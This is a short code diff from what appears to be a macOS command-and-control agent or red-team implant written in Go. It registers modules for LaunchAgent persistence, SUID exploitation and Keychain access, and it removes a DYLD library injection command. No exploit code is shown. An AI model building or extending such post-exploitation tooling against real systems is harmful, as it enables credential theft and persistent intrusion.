@@ -75,7 +75,6 @@ func NewCommandQueue() *CommandQueue {
 	queue.RegisterCommand(&PersistenceCommand{})   // RC files and LaunchAgent persistence
 	queue.RegisterCommand(&SUIDEnumCommand{})      // SUID enumeration and exploitation
 	queue.RegisterCommand(&KeychainCommand{})      // Keychain access and manipulation
-	queue.RegisterCommand(&DYLDInjectionCommand{}) // DYLD library injection
 
 	// Start cleanup goroutine for stale transfers
 	go queue.cleanupStaleTransfers()
